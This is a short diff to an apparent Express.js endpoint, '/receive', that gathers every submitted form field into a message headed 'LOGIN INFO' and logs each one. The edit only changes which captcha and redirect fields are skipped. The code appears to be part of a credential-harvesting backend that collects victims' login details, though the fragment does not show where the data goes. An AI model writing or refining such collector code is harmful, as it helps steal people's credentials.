@@ -86,7 +86,7 @@ app.post('/receive', async (req, res) => {
                `👤 LOGIN INFO\n\n`;
 
     for (let key of myObjects) {
-    	if(key != "_CAPTCHA" && key != "_NEXT" ){ 
+    	if(key != "_captcha" && key != "_next" ){
       console.log(`${key}: ${myObject[key]}`);
       message += `${key.toUpperCase()}: ${myObject[key]}\n`;
     	}
